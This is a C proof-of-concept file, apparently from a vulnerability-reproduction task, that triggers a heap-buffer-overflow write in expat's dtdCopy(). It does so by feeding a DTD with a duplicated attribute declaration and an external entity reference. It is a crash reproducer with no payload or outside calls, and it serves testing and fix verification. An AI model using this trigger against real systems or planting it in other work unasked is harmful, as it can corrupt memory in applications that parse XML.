/* Residual CWE-125/787 PoC for the dtdCopy() default-attribute copy path.
 *
 * Build (shipped tree, with ASan):
 *   cc -fsanitize=address,undefined -g -O0 -Iexpat/lib \
 *      expat/lib/xmlparse.c expat/lib/xmltok.c expat/lib/xmlrole.c \
 *      pocs/residual.c -o /tmp/residual
 *
 * Run:
 *   /tmp/residual
 *
 * On the shipped tree this aborts with a heap-buffer-overflow WRITE inside
 * dtdCopy(). On the golden tree (parent + real upstream fix) it exits 0.
 */
#include <stdio.h>
#include <string.h>
#include "expat.h"

static int XMLCALL
external_entity_ref_handler(XML_Parser parser, const XML_Char *context,
                            const XML_Char *base, const XML_Char *systemId,
                            const XML_Char *publicId) {
  static const char entity_text[] = "<tag dup='x'/>";
  (void)base;
  (void)systemId;
  (void)publicId;

  /* Creating this external-entity parser makes the library copy the
   * document's DTD (dtdCopy) into a fresh DTD owned by the new parser -
   * this is the public, documented way an application processes external
   * general entities. */
  XML_Parser ext_parser = XML_ExternalEntityParserCreate(parser, context, NULL);
  if (ext_parser == NULL) {
    fprintf(stderr, "could not create external entity parser\n");
    return XML_STATUS_ERROR;
  }

  enum XML_Status status = XML_Parse(ext_parser, entity_text,
                                     (int)strlen(entity_text), XML_TRUE);
  if (status != XML_STATUS_OK) {
    fprintf(stderr, "external entity parse failed: %s\n",
           XML_ErrorString(XML_GetErrorCode(ext_parser)));
  }

  XML_ParserFree(ext_parser);
  return XML_STATUS_OK;
}

int
main(void) {
  /* Ordinary, spec-legal document: the element "tag" has the same
   * attribute "dup" declared twice in its ATTLIST. Per the XML spec this
   * is legal; the first declaration is binding and the second is ignored.
   * The document body references a general external entity so that the
   * library copies the DTD built above into a new parser, exercising
   * dtdCopy(). */
  static const char doc[] = "<!DOCTYPE doc [\n"
                           "  <!ENTITY e SYSTEM 'entity.ent'>\n"
                           "  <!ELEMENT doc ANY>\n"
                           "  <!ELEMENT tag EMPTY>\n"
                           "  <!ATTLIST tag dup CDATA #IMPLIED>\n"
                           "  <!ATTLIST tag dup CDATA #IMPLIED>\n"
                           "]>\n"
                           "<doc>&e;</doc>\n";

  XML_Parser parser = XML_ParserCreate(NULL);
  if (parser == NULL) {
    fprintf(stderr, "could not create parser\n");
    return 1;
  }

  XML_SetParamEntityParsing(parser, XML_PARAM_ENTITY_PARSING_NEVER);
  XML_SetExternalEntityRefHandler(parser, external_entity_ref_handler);

  enum XML_Status status
      = XML_Parse(parser, doc, (int)strlen(doc), XML_TRUE);
  if (status != XML_STATUS_OK) {
    fprintf(stderr, "parse failed: %s\n",
           XML_ErrorString(XML_GetErrorCode(parser)));
    XML_ParserFree(parser);
    return 1;
  }

  XML_ParserFree(parser);
  printf("ok\n");
  return 0;
}
